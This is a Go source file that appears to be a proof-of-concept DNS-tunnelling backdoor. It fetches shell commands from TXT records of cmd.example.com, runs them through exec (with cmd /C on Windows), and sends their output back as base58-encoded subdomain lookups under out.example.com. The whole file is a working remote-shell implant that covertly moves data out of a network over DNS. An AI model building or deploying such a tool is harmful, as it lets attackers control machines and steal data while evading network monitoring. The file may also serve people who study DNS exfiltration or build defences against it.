package main

import (
	"bytes"
	"context"
	"encoding/binary"
	"fmt"
	"log"
	"net"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"github.com/btcsuite/btcutil/base58"
)

func main() {
	// Create dns resolver
	r := &net.Resolver{
		PreferGo: true,
		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
			d := net.Dialer{
				Timeout: time.Millisecond * time.Duration(10000),
			}
			return d.DialContext(ctx, "udp", "127.0.0.1:53")
		},
	}
	commandChan := make(chan string)
	responseChan := make(chan []byte)
	go getCommand(r, commandChan)
	go handleCommands(commandChan, responseChan)
	returnResponses(r, responseChan)
}

//Contact the server and get commands
func getCommand(r *net.Resolver, c chan string) {
	for {
		//get shell command using dns TXT record
		data, err := r.LookupTXT(context.Background(), "cmd.example.com")
		if err != nil {
			log.Fatal(err)
			return
		}
		c <- data[0]
		time.Sleep(1 * time.Second)
	}
}

//Pass command to the responChan after convertion into an executable command
func handleCommands(commandChan chan string, responseChan chan []byte) {
	fmt.Println("waiting for commands...")
	for {
		TXTResponse := <-commandChan
		if TXTResponse != "" {
			fmt.Println("$ " + TXTResponse)
			var args []string
			if strings.Contains(TXTResponse, " ") {
				args = strings.Split(TXTResponse, " ")
			} else {
				args = append(args, TXTResponse)
			}

			cmd := createCommand(args)
			//Exec command
			stdout, err := cmd.Output()
			if err != nil {
				responseChan <- []byte(err.Error())
			} else {
				responseChan <- stdout
			}

		}
	}
}

//Converts the command into an executable command
func createCommand(args []string) *exec.Cmd {
	if runtime.GOOS == "windows" {
		args = append([]string{"cmd", "/C"}, args...)
	}
	fmt.Println(args)
	var cmd *exec.Cmd
	if len(args) > 1 {
		cmd = exec.Command(args[0], args[1:]...)

	} else {
		cmd = exec.Command(args[0])
	}

	return cmd

}

func returnResponses(r *net.Resolver, responseChan chan []byte) {
	for {
		cmdOutput := <-responseChan
		requests := encodeRequests(cmdOutput)
		for i, request := range requests {
			fmt.Println(i, " ", request)
			_, err := r.LookupHost(context.Background(), request)
			if err != nil {
				fmt.Println(err)
			}
		}
	}
}

func encodeRequests(cmdOutput []byte) []string {
	var requests []string
	var packetNumber uint16 = 0
	var builder strings.Builder
	//Bytes for the current level (max 32)
	var levelBytes []byte
	//Number of levels
	var nLevels uint16 = 0
	for i := 0; i < len(cmdOutput); i++ {
		if nLevels%3 == 0 && len(levelBytes) == 0 {
			if nLevels != 0 {
				//we need to create a new request
				builder.WriteString("out.example.com")
				requests = append(requests, builder.String())
				builder.Reset()
			}
			//first level of the request
			buf := new(bytes.Buffer)
			binary.Write(buf, binary.BigEndian, packetNumber)
			packetNumber++
			bytes := buf.Bytes()
			bytes[0] = bytes[0] & 127
			//update the msb if this is the last request
			if len(cmdOutput)-i < (32*3 - 2) {
				bytes[0] = bytes[0] | 128
			}

			levelBytes = append(levelBytes, bytes...)
		}
		//add the current byte
		levelBytes = append(levelBytes, cmdOutput[i])
		if len(levelBytes) > 32 {
			log.Fatal("The maximum number of byte per level is 32")
		} else if len(levelBytes) == 32 {
			//Encode the current level
			builder.WriteString(base58.Encode(levelBytes))
			builder.WriteString(".")
			levelBytes = levelBytes[:0]
			nLevels++
		}

	}
	if len(levelBytes) > 0 {
		builder.WriteString(base58.Encode(levelBytes))
		builder.WriteString(".")
	}
	builder.WriteString("out.example.com")
	requests = append(requests, builder.String())
	return requests
}
